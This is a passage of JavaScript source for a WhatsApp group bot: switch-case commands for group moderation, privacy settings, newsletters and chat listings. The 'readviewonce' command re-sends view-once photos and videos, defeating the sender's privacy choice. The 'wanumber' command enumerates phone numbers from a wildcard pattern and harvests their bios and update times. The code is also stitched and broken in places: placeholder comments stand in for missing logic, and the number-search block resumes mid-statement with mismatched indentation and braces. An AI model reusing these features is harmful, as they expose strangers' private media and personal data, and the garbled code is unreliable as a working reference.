    if (!isCreator) return newReply(mess.owner);
    if (!text) return newReply('Please enter the case name you want to search for! 🧐');
    try {
        const getCase = (cases) => {
            const fileContent = fs.readFileSync("./case.js", "utf-8");
            const caseBlock = fileContent.split(`case '${cases}'`)[1];
            if (!caseBlock) throw new Error('Case not found');
            return `case '${cases}'` + caseBlock.split("break")[0] + "break";
        }
        newReply(`${getCase(text)}`);
    } catch (err) {
        newReply(`Case '${text}' not found! 🚫`);
    }
}
break;

case 'nsfw': {
    if (!m.isGroup) return newReply(mess.group);
    if (!isBotAdmins) return newReply(mess.botAdmin);
    if (!isAdmins && !isCreator) return newReply(mess.admin);
    if (args[0] === 'on') {
        if (AntiNsfw) return newReply('NSFW feature already active previously!');
        ntnsfw.push(m.chat);
        fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw));
        newReply('NSFW feature successfully activated in this group!');
        let groupInfo = await sock.groupMetadata(m.chat);
        let members = groupInfo['participants'].map(member => member.id.replace('c.us', 's.whatsapp.net'));
        let warningText = '*「 ⚠️ DANGER ⚠️ 」*\n\n';
        warningText += 'NSFW feature has been activated in this group!\n';
        warningText += 'That means you can access sensitive content through the bot!\n';
        newReply(warningText);
    } else if (args[0] === 'off') {
        if (!AntiNsfw) return newReply('NSFW feature already inactive previously!');
        let index = ntnsfw.indexOf(m.chat);
        if (index !== -1) ntnsfw.splice(index, 1);
        fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw));
        newReply('NSFW feature successfully deactivated in this group!');
    } else {
        let helpText = 'Please choose the correct option!\n\n';
        helpText += `Example:\n${prefix + command} on → to activate\n`;
        helpText += `${prefix + command} off → to deactivate`;
        newReply(helpText);
    }
}
break;

// the long list of toggles for antifeatures and auto features
case 'antiaudio':
// ... rest of case names ...
{
    let settings = {
        antiaudio: 'antiaudio',
        antiforeign: 'antiforeignnum',
        antisticker: 'antisticker',
        antiimage: 'antiimage',
        antivideo: 'antivideo',
        antiviewonce: 'antiviewonce',
        antibot: 'antibot',
        antispam: 'antispam',
        antimeda: 'antimedia',
        antidocument: 'antidocument',
        anticontact: 'anticontact',
        antilocation: 'antilocation',
        antilink: 'antilink',
        antilinkgc: 'antilinkgc',
        autoaigc: 'autoaigc',
        autoaipc: 'autoaipc',
        autoaijapri: 'autoaijapri',
        antibadword: 'badword',
        antitoxic: 'badword'
    };
    let settingKey = settings[command];
    if (!settingKey) return;
    if (!m.isGroup && command !== 'autoaipc') return newReply("❗ Sorry, this command can only be used in groups!");
    if (m.isGroup && !isBotAdmins && command !== 'autoaipc') return newReply("❗ I need to be admin first to run this command!");
    if (m.isGroup && !isAdmins && !isCreator && command !== 'autoaipc') return newReply("❗ Only admins can set this feature!");
    if (command === 'autoaipc' && !isCreator) return newReply("❗ Only the bot owner can activate or deactivate this feature!");
    if (args.length < 1) return newReply(`⚠️ *Wrong format!*\nUse command:\n${prefix + command} true/false`);
    if (args[0] === 'true') {
        db.data.chats[m.chat][settingKey] = true;
        newReply(`✅ *${command} feature successfully activated!* Now this feature will run according to its settings.`);
    } else if (args[0] === 'false') {
        db.data.chats[m.chat][settingKey] = false;
        newReply(`❌ *${command} feature has been turned off!* Don’t worry, I won’t turn this feature on until it’s activated again.`);
    } else {
        newReply(`⚠️ *Oops! Wrong format!*\nUse command:\n${prefix + command} true/false`);
    }
}
break;

// ... many other cases ...

case 'liat':
case 'rvo':
case 'readviewonce': {
    if (!isAdmins && !isCreator) return newReply(mess.admin);
    if (!m.quoted) return newReply(`Reply to the view-once message! 🙏`);
    if (m.quoted.mtype !== 'viewOnceMessageV2') return newReply(`Hmm... this isn’t a view-once message! 🤔`);
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return sock.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return sock.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break;

// ... further cases ...

case 'mute':
case 'welcome':
case 'left':
case 'adminevent':
case 'groupevent': {
    if (!m.isGroup) return newReply(mess.group);
    if (!isAdmins && !isCreator) return newReply(mess.admin);
    if (command === 'mute' && !isBotAdmins) return newReply(mess.botAdmin);

    if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`);

    let settings = {
        mute: 'mute',
        welcome: 'welcome',
        left: 'left',
        adminevent: 'adminevent',
        groupevent: 'groupevent'
    };

    let settingKey = settings[command];
    if (!settingKey) return;

    if (args[0] === 'true') {
        db.data.chats[m.chat][settingKey] = true;
        newReply(`✅ *${command} feature has been activated!*`);
    } else if (args[0] === 'false') {
        db.data.chats[m.chat][settingKey] = false;
        newReply(`❌ *${command} feature has been deactivated!*`);
    } else {
        newReply(`❗ *Use the correct command:*\n${prefix + command} true/false`);
    }
}
break;

case 'sider':
case 'gcsider': {
    let lama = 86400000 * 7
    const now = new Date().toLocaleString("en-US", {
        timeZone: "Asia/Jakarta"
    });
    const milliseconds = new Date(now).getTime();

    let member = groupMetadata.participants.map(v => v.id)
    if (!text) {
        let pesan = "Please be active in the group because members will be cleaned up at any time"
    } else {
        let pesan = text
    }
    let sum
    sum = member.length
    let total = 0
    let sider = []
    for (let i = 0; i < sum; i++) {
        let users = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
        if ((typeof db.data.users[member[i]] == 'undefined' || milliseconds * 1 - db.data.users[member[i]].lastseen > lama) && !users.isAdmin && !users.isSuperAdmin) {
            if (typeof db.data.users[member[i]] !== 'undefined') {
                if (db.data.users[member[i]].banned == true) {
                    total++
                    sider.push(member[i])
                }
            } else {
                total++
                sider.push(member[i])
            }
        }
    }
    if (total == 0) return newReply(`*There are no sidereaders in this group.*`)
    newReply(`*${total}/${sum}* members of group *${groupName}* are sidereaders for the following reasons :\n1. Unavailable for more than 7 days\n2. Newly joined but never joined the conversation\n\n_“${pesan}”_\n\n*SIDEREADERS LIST :*\n${sider.map(v => ' · @' + v.replace(/@.+/, '' + typeof db.data.users[v] == "undefined" ? ' Sider ' : ' Off ' + msToDate(milliseconds * 1 - db.data.users[v].lastseen))).join('\n')}`);
}
break

case 'hedsot':
case 'buang':
case 'kick': {
    if (!m.isGroup) return newReply('Oops, this command can only be used in groups, sis/bro! 🤭');
    if (!isCreator && !isAdmins) return newReply('Sorry, only admin or owner can use this command. 🙏');
    if (!isBotAdmins) return newReply('I’m not admin yet, sis/bro. Make me admin first so I can help! 😢');
    if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) {
        return newReply('Hmm... Who do you want to kick? Mention the person! 🤔');
    }
    let users = m.mentionedJid[0] 
    ? m.mentionedJid[0] 
    : m.quoted 
    ? m.quoted.sender 
    : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    if (ownerNumber.includes(users.replace('@s.whatsapp.net', ''))) {
        return newReply('Hey, that’s my owner, sis/bro! Don’t mess around, I might get scolded. 😣');
    }
    try {
        await sock.groupParticipantsUpdate(m.chat, [users], 'remove');
        newReply('Yay, it worked sis/bro! Bye-bye the person earlier~ 👋✨');
    } catch (err) {
        console.error(err);
        newReply('Oops, something went wrong when I tried to kick the person. Check again, okay? 😥');
    }
};
break;

case 'wanumber':
case 'nowa':
case 'searchno':
case 'searchnumber': {
    if (!text) return newReply(`Sis/Bro, please give a number in the correct format!\n\n*Send command*: *${prefix + command} 6281234567x* 😄`);
    let inputnumber = text.split(" ")[0];
    newReply('Wait a moment sis/bro, I’m searching the number... 🔍✨');
    function countInstances(string, word) {
        return string.split(word).length - 1;
    }
    let number0 = inputnumber.split('x')[0];
    let number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] || '';
    let random_length = countInstances(inputnumber, 'x');
    let randomxx = Math.pow(10, random_length); // Decide number of iterations based on 'x'
    let resultText = `📱 *WhatsApp Number Search Results*: 📱\n\n`;
    let nobio = `📌 *Numbers Without Bio*: 📌\n`;
    let nowhatsapp = `🚫 *Numbers Not Registered on WhatsApp*: 🚫\n`;
    for (let i = 0; i < randomxx; i++) {
        let randomDigits = String(i).padStart(random_length, '0'); // Format digits according to number of 'x'
        let formattedNumber = `${number0}${randomDigits}${number1}`;
        try {
            let anu = await sock.onWhatsApp(`${formattedNumber}@s.whatsapp.net`);
            if (anu.length === 0) {
                // ... presumably add to nowhatsapp ...
            }
            // ... rest of logic ...
        }
        // ... rest of code ...
}      
nowhatsapp += `- ${formattedNumber}\n`;
							continue;
						}
						let anu1;
						try {
							anu1 = await sock.fetchStatus(anu[0].jid);
						} catch {
							anu1 = { status: '', setAt: null };
						}
						if (!anu1.status || anu1.status.length === 0) {
							nobio += `- wa.me/${anu[0].jid.split("@")[0]}\n`;
						} else {
							resultText += `🪀 *Number*: wa.me/${anu[0].jid.split("@")[0]}\n`;
							resultText += `🎗️ *Bio*: ${anu1.status}\n`;
							resultText += `🗓️ *Last Updated*: ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`;
						}
					} catch (err) {
						console.error(err);
						nowhatsapp += `- ${formattedNumber}\n`;
					}
				}
				let finalMessage = '✨ *Search Completed, Kak!* ✨\n\n';
				finalMessage += resultText;
				finalMessage += `\n${nobio}`;
				finalMessage += `\n${nowhatsapp}`;
				finalMessage += `\nIf you need help again, just call me! 🤗`;
				newReply(finalMessage);
			}
			break;

			case 'add': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!text && !m.quoted) {
					newReply(`Command usage: ${prefix + command} 62xxx`);
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender;
					try {
						await sock.groupParticipantsUpdate(m.chat, [numbersOnly], 'add')
							.then(async (res) => {
								for (let i of res) {
									let invv = await sock.groupInviteCode(m.chat);
									if (i.status == 408) return newReply('Oh no, it seems the user just left this group! 😔');
									if (i.status == 401) return newReply('Oops, it looks like the user blocked this bot! 😢');
									if (i.status == 409) return newReply('Wow, this user is already in the group! 🎉');
									if (i.status == 500) return newReply('Sorry, this group is full! 😞');
									if (i.status == 403) {
										await sock.sendMessage(m.chat, { 
											text: `@${numbersOnly.split('@')[0]} Can't be added\n\nBecause the target is super private! 😅\n\nBut, the invitation will be sent to\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nVia private chat!`, 
											mentions: [numbersOnly] 
										}, { quoted: m });
										await sock.sendMessage(`${numbersOnly ? numbersOnly : creator}`, { 
											text: `${'https://chat.whatsapp.com/' + invv}\n━━━━━━━━━━━━━━━━━━━━━\n\nAdmin: wa.me/${m.sender}\nInvites you to this group\nPlease join if you'd like! 🙇`, 
											detectLink: true, 
											mentions: [numbersOnly] 
										}, { quoted: floc2 }).catch((err) => newReply('Failed to send invitation! 😔'));
									} else {
										newReply(mess.done);
									}
								}
							});
					} catch (e) {
						newReply('Failed to add the user, something went wrong! 😢');
					}
				}
			}
			break;

			case 'promote':
			case 'pm': {
				if (!m.isGroup) return newReply(mess.group)
				if (!isCreator && !isAdmins) return newReply(mess.admin)
				if (!isBotAdmins) return newReply(mess.botAdmin)
				if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return newReply('Hmm... Who do you want to promote?');
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Hmm... Who do you want to ${command}? 🤔`)
				await sock.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => newReply(mess.done)).catch((err) => newReply(mess.error))
			}
			break

			case 'demote':
			case 'dm': {
				if (!m.isGroup) return newReply(mess.group)
				if (!isCreator && !isAdmins) return newReply(mess.admin)
				if (!isBotAdmins) return newReply(mess.botAdmin)
				if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return newReply('Hmm... Who do you want to demote? 🤔')
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Hmm... Who do you want to ${command}? 🤔`)
				await sock.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => newReply(mess.done)).catch((err) => newReply(mess.error))
			}
			break

			case 'revoke':{
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				await sock.groupRevokeInvite(m.chat)
					.then(res => {
						newReply(mess.done)
					}).catch(() => newReply(mess.error))
				}
				break

			case 'setnamegc':
			case 'setsubject':
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!text) return newReply('What should we name the group, Kak? 🤔');
				await sock.groupUpdateSubject(m.chat, text);
				newReply(mess.done);
			break;

			case 'setppgroup': 
			case 'setppgrup': 
			case 'setppgc': {
				if (!m.isGroup) return newReply(mess.group)
				if (!isAdmins) return newReply(mess.admin)
				if (!isBotAdmins) return newReply(mess.botAdmin)
				if (!quoted) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
				if (!/image/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
				if (/webp/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
				let media = await sock.downloadAndSaveMediaMessage(quoted)
				await sock.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
				newReply(mess.done)
			}
			break

			case 'deleteppgroup': 
			case 'delppgc': 
			case 'deleteppgc': 
			case 'delppgroup': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				await sock.removeProfilePicture(m.chat)
			}
			break;

			case 'setppbot': {
				if (!isCreator) return newReply(mess.owner)
				if (!quoted) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
				if (!/image/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
				if (/webp/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
				let media = await sock.downloadAndSaveMediaMessage(quoted)
				await sock.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
				newReply(mess.done)
			}
			break;

			case 'pppanjang': case 'setppbot2':{
				if (!isCreator) return newReply(mess.owner)
				if (!quoted) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
				if (!/image/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
				if (/webp/.test(mime)) return newReply(`Send/Reply Image With Caption ${prefix + command}`)
				let media = await sock.downloadAndSaveMediaMessage(quoted);
				const { img } = await generateProfilePicture(media);
				await sock.query({
					tag: 'iq',
					attrs: {
						to: botNumber,
						type:'set',
						xmlns: 'w:profile:picture'
					},
					content: [
						{
							tag: 'picture',
							attrs: { type: 'image' },
							content: img
						} 
					]
				})
				newReply(mess.done);
			}
			break

			case 'deleteppbot': 
			case 'delppbot': {
				if (!isCreator) return newReply(mess.owner);
				await sock.removeProfilePicture(sock.user.id)
				newReply(mess.done)
			}
			break;

			case 'setbiobot':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Where is the text?\nExample: ${prefix + command} I am an AI`)
				await sock.updateProfileStatus(text)
				newReply(mess.done)
			}
			break;

			case 'setdesc':
			case 'setdesk':
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin);
				if (!isBotAdmins) return newReply(mess.botAdmin);
				if (!text) return newReply('Text ?')
				await sock.groupUpdateDescription(m.chat, text)
				newReply(mess.done)
			break;

			case 'cleardesc':
			case 'cleardesk':{
				if (!m.isGroup) return newReply('This command can only be used in a group.');
				if (!isAdmins && !isGroupOwner && !isCreator) return newReply('This command can only be used by admins.');
				try {
					await sock.groupUpdateDescription(m.chat, null);
					newReply('Group description successfully deleted.');
				} catch (err) {
					console.error(err);
					newReply('Failed to delete group description.');
				}
			}
			break;

			// New Feature (Beta Feature)
			case 'setcallprivacy':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Usage:\nsetcallprivacy <value>\n\nValue options:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
				const callValue = text.toLowerCase();
				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(callValue)) {
					return newReply('Invalid value. Choose one: none, contacts, everyone, mycontacts, mycontactsexcept.');
				}
				try {
					await sock.updateCallPrivacy(callValue);
					newReply(`Successfully set call privacy to "${callValue}".`);
				} catch (err) {
					console.error(err);
					newReply('An error occurred while setting call privacy.');
				}
			}
			break;

			case 'setlastprivacy':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Usage:\nsetlastprivacy <value>\n\nValue options:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
				const lastValue = text.toLowerCase();
				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(lastValue)) {
					return newReply('Invalid value. Choose one: none, contacts, everyone, mycontacts, mycontactsexcept.');
				}
				try {
					await sock.updateLastSeenPrivacy(lastValue);
					newReply(`Successfully set last seen privacy to "${lastValue}".`);
				} catch (err) {
					console.error(err);
					newReply('An error occurred while setting last seen privacy.');
				}
			}
			break;

			case 'setonlineprivacy':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Usage:\nsetonlineprivacy <value>\n\nValue options:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
				const onlineValue = text.toLowerCase();
				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(onlineValue)) {
					return newReply('Invalid value. Choose one: none, contacts, everyone, mycontacts, mycontactsexcept.');
				}
				try {
					await sock.updateOnlinePrivacy(onlineValue);
					newReply(`Successfully set online privacy to "${onlineValue}".`);
				} catch (err) {
					console.error(err);
					newReply('An error occurred while setting online privacy.');
				}
			}
			break;

			case 'setprofileprivacy':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Usage:\nsetprofileprivacy <value>\n\nValue options:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
				const profileValue = text.toLowerCase();
				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(profileValue)) {
					return newReply('Invalid value. Choose one: none, contacts, everyone, mycontacts, mycontactsexcept.');
				}
				try {
					await sock.updateProfilePicturePrivacy(profileValue);
					newReply(`Successfully set profile picture privacy to "${profileValue}".`);
				} catch (err) {
					console.error(err);
					newReply('An error occurred while setting profile picture privacy.');
				}
			}
			break;

			case 'setstatusprivacy':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Usage:\nsetstatusprivacy <value>\n\nValue options:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
				const statusValue = text.toLowerCase();
				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(statusValue)) {
					return newReply('Invalid value. Choose one: none, contacts, everyone, mycontacts, mycontactsexcept.');
				}
				try {
					await sock.updateStatusPrivacy(statusValue);
					newReply(`Successfully set status privacy to "${statusValue}".`);
				} catch (err) {
					console.error(err);
					newReply('An error occurred while setting status privacy.');
				}
			}
			break;

			case 'setreadreceiptsprivacy':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Usage:\nsetreadreceiptsprivacy <value>\n\nValue options:\n- none\n- contacts\n- everyone\n- mycontacts\n- mycontactsexcept`);	
				const readReceiptsValue = text.toLowerCase();
				if (!['none', 'contacts', 'everyone', 'mycontacts', 'mycontactsexcept'].includes(readReceiptsValue)) {
					return newReply('Invalid value. Choose one: none, contacts, everyone, mycontacts, mycontactsexcept.');
				}
				try {
					await sock.updateReadReceiptsPrivacy(readReceiptsValue);
					newReply(`Successfully set read receipts privacy to "${readReceiptsValue}".`);
				} catch (err) {
					console.error(err);
					newReply('An error occurred while setting read receipts privacy.');
				}
			}
			break;

			case 'setreactionmode':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply('Usage: setreactionmode <mode>\n\nExamples:\nsetreactionmode enabled\ntsetreactionmode disabled');	
				const reactionMode = text.toLowerCase();
				if (!['enabled', 'disabled'].includes(reactionMode)) {
					return newReply('Invalid mode. Choose "enabled" or "disabled".');
				}
				try {
					await sock.newsletterReactionMode(saluran, reactionMode);
					newReply(`Successfully set reaction mode to "${reactionMode}".`);
				} catch (err) {
					console.error(err);
					newReply('An error occurred while setting reaction mode.');
				}
			}
			break;

			case 'setnewsletterdesc':{
				if (!isCreator) return newReply(mess.owner);
				if (!args.join(' ')) return newReply('Usage: setnewsletterdesc <description>\n\nExample:\nsetnewsletterdesc This is a new description.');	
				const description = args.join(' ');
				try {
					await sock.newsletterUpdateDescription(saluran, description);
					newReply('Successfully updated newsletter description.');
				} catch (err) {
					console.error(err);
					newReply('An error occurred while updating the description.');
				}
			}
			break;

			case 'setnewslettername':{
				if (!isCreator) return newReply(mess.owner);
				if (!args.join(' ')) return newReply('Usage: setnewslettername <name>\n\nExample:\nsetnewslettername New Newsletter Name.');	
				const name = args.join(' ');
				try {
					await sock.newsletterUpdateName(saluran, name);
					newReply('Successfully updated newsletter name.');
				} catch (err) {
					console.error(err);
					newReply('An error occurred while updating the name.');
				}
			}
			break;

			case 'setnewsletterpic':{
				if (!isCreator) return newReply(mess.owner);
				if (!m.quoted || !m.quoted.isMedia) return newReply('Reply to an image to set as the newsletter profile picture.');	
				try {
					const media = await m.quoted.download();
					await sock.newsletterUpdatePicture(saluran, media);
					newReply('Successfully updated newsletter profile picture.');
				} catch (err) {
					console.error(err);
					newReply('An error occurred while updating the profile picture.');
				}
			}
			break;

			case 'removenewsletterpic':{
				if (!isCreator) return newReply(mess.owner);
				try {
					await sock.newsletterRemovePicture(saluran);
					newReply('Successfully removed newsletter profile picture.');
				} catch (err) {
					console.error(err);
					newReply('An error occurred while removing the profile picture.');
				}
			}
			break;

			case 'follownewsletter':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Send command ${prefix + command} <link>`);
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
				try {
					let result = args[0].split('https://whatsapp.com/channel/')[1];
					let data = await sock.newsletterMetadata("invite", result);
					await sock.newsletterFollow(data.id);
					newReply('Successfully followed the newsletter.');
				} catch (err) {
					console.error(err);
					newReply('An error occurred while following the newsletter.');
				}
			}
			break;

			case 'unfollownewsletter':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Send command ${prefix + command} <link>`);
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
				try {
					let result = args[0].split('https://whatsapp.com/channel/')[1];
					let data = await sock.newsletterMetadata("invite", result);
					await sock.newsletterUnfollow(data.id);
					newReply('Successfully unfollowed the newsletter.');
				} catch (err) {
					console.error(err);
					newReply('An error occurred while unfollowing the newsletter.');
				}
			}
			break;

			case 'mutenewsletter':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Send command ${prefix + command} <link>`);
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
				try {
					let result = args[0].split('https://whatsapp.com/channel/')[1];
					let data = await sock.newsletterMetadata("invite", result);
					await sock.newsletterMute(data.id);
					newReply('Successfully muted notifications from the newsletter.');
				} catch (err) {
					console.error(err);
					newReply('An error occurred while muting notifications.');
				}
			}
			break;

			case 'unmutenewsletter':{
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`Send command ${prefix + command} <link>`);
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
				try {
					let result = args[0].split('https://whatsapp.com/channel/')[1];
					let data = await sock.newsletterMetadata("invite", result);
					await sock.newsletterUnmute(data.id);
					newReply('Successfully unmuted notifications from the newsletter.');
				} catch (err) {
					console.error(err);
					newReply('An error occurred while unmuting notifications.');
				}
			}
			break;
	
			case 'createnewsletter':{
				if (!isCreator) return newReply(mess.owner);
				if (!args[0] || !args[1]) return newReply('Usage: createnewsletter <name> | <description>\n\nExample:\ncreatenewsletter New Newsletter | This is the newsletter description.');
				const [newsletterName, newsletterDesc] = args.join(' ').split('|').map((v) => v.trim());
				if (!newsletterName || !newsletterDesc) {
					return newReply('Wrong format. Use "|" to separate name and description.');
				}
				try {
					const result = await sock.newsletterCreate(newsletterName, newsletterDesc);
					newReply(`Newsletter successfully created.\n\nName: ${result.name}\nDescription: ${result.description}`);
				} catch (err) {
					console.error(err);
					newReply('An error occurred while creating the newsletter.');
				}
			}
			break;

			case 'newsletterinfo':
			case 'getnewsletterinfo':{
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply(`Send command ${prefix + command} <link>`);
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com/channel')) return newReply(mess.error);
				function formatDate(timestamp) {
					const date = new Date(timestamp * 1000);
					const months = [
						'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
						'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'
					];
					const day = date.getDate();
					const month = months[date.getMonth()];
					const year = date.getFullYear();
					return `${day} ${month} ${year}`;
				}
				 	try {
		let result = args[0].split('https://whatsapp.com/channel/')[1];
		let data = await sock.newsletterMetadata("invite", result);
		let teks = `「 *NEWSLETTER METADATA* 」\n\n`;
		teks += `- *Name*: ${data.name}\n`;
		teks += `- *ID*: ${data.id}\n`;
		teks += `- *Status*: ${data.state}\n`;
		teks += `- *Created On*: ${formatDate(data.creation_time)}\n`;
		teks += `- *Subscribers*: ${data.subscribers}\n`;
		teks += `- *Meta Verify*: ${data.verification}\n`;
		teks += `- *React Emoji*: ${data.reaction_codes}\n`;
		teks += `- *Description*:\n${data.description}\n`;
		let button = [{
			"name": "cta_copy",
			"buttonParamsJson": `{
				"display_text": "Copy Newsletter ID",
				"id": "${data.id}",
				"copy_code": "${data.id}"
			}`
		}];
		sock.sendButtonText(m.chat, button, teks, footer, m)
	} catch (error) {
		newReply('*Data not found!* ☹️');
	}
}
break;
// End New Feature (Beta Feature)

case 'listpc': {
	if (!isCreator) return newReply(mess.owner);
	let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id);
	let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chats : ${anu.length} Chats\n\n`;
	for (let i of anu) {
		let nama = store.messages[i].array[0].pushName;
		teks += `*Name*: ${nama}\n`;
		teks += `*User*: @${i.split('@')[0]}\n`;
		teks += `*Chat*: https://wa.me/${i.split('@')[0]}\n\n`;
		teks += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
	}
	newReply(teks)
}
break;

case 'listgc': {
	if (!isCreator) return newReply(mess.owner);
	let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id);
	let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Groups : ${anu.length} Groups\n\n`;
	for (let i of anu) {
		let metadata = await sock.groupMetadata(i);
		teks += `*Name*: ${metadata.subject}\n`;
		teks += `*Admin*: ${metadata.owner ? `@${metadata.owner.split('@')[0]}` : '-' }\n`;
		teks += `*ID*: ${metadata.id}\n`;
		teks += `*Created*: ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`;
		teks += `*Members*: ${metadata.participants.length}\n\n`;
		teks += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
	}
	newReply(teks)
}
break;

case 'listonline': case 'liston': {
	if (!m.isGroup) return newReply(mess.group);
	let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
	let online = [...Object.keys(store.presences[id]), botNumber]
	await sock.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `@` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => newReply('*Data not found! ☹️*'))
}
break;

case 'creategroup':{
	if (!isCreator) return newReply(mess.owner);
	if (!text) return newReply('Usage: creategroup <group name> | <member numbers separated by commas>\n*Send command*: creategroup New Group | 6281234567890,6289876543210');
	const [groupName, members] = text.split('|').map(v => v.trim());
	if (!groupName || !members) return newReply('Wrong format!');
	const participants = members.split(',').map(num => `${num}@s.whatsapp.net`);
	try {
		const groupInfo = await sock.groupCreate(groupName, participants);
		newReply(`*Group successfully created*:\n- *Name*: ${groupInfo.subject}\n- *ID*: ${groupInfo.id}`);
	} catch (err) {
		console.error(err);
		newReply('Failed to create group.');
	}
}
break;

case 'group':
case 'grup': {
	if (!m.isGroup) return newReply(mess.group);
	if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin);
	if (!isBotAdmins) return newReply(mess.botAdmin);
	if (args[0] === 'close') {
		await sock.groupSettingUpdate(m.chat, 'announcement')
			.then(() => newReply('✅ Group successfully closed, only admins can send messages now! 🔒'))
			.catch((err) => newReply(`⚠️ Failed to close group: ${err}`));
	} else if (args[0] === 'open') {
		await sock.groupSettingUpdate(m.chat, 'not_announcement')
			.then(() => newReply('✅ Group successfully opened, all members can send messages now! 🔓'))
			.catch((err) => newReply(`⚠️ Failed to open group: ${err}`));
	} else {
		newReply(`⚙️ Command usage:\n · *${prefix + command} open* → Open group\n · *${prefix + command} close* → Close group`);
	}
}
break;

case 'getpp': {
	if (!isPremium) return newReply(mess.premium);
